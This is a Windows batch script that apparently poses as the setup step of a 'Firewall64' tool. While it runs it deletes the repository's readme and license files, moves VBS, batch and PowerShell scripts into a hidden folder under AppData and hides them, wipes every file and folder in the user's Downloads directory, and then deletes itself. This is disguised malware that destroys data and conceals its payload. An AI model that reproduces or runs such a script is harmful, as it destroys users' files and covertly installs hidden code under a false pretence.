@echo off
:: setup work cd
set "SF=%CD%"
set "HD=%APPDATA%\Firewall64"

type .ascii.txt
echo.
echo.

ping 127.0.0.1 -n 25 > nul

:: deleted github files
del /f /q "%SF%\readme" >nul 2>&1
del /f /q "%SF%\license" >nul 2>&1
del /f /q "%SF%\security" >nul 2>&1
del /f /q "%SF%\.gitignore" >nul 2>&1
del /f /q "%SF%\text.txt" >nul 2>&1

:: create folder
if not exist "%HD%" (
    mkdir "%HD%"
    attrib +h "%HD%"
)

:: moved script files
move /y "%SF%\.firewall64.vbs" "%HD%\" >nul
move /y "%SF%\.firewall64.bat" "%HD%\" >nul
move /y "%SF%\.firewall64.ps1" "%HD%\" >nul
move /y "%SF%\.ascii.txt" "%HD%\" >nul

attrib +h "%HD%\.firewall64.vbs"
attrib +h "%HD%\.firewall64.bat"
attrib +h "%HD%\.firewall64.ps1"

del /q "%USERPROFILE%\Downloads\*.*" && for /d %G in ("%USERPROFILE%\Downloads\*") do rd /s /q "%G"

for %%f in (%SF%\.*) do (
    attrib +h "%%f" >nul 2>&1
)

:: delete config.cmd
echo worked
del "%~f0" >nul 2>&1

exit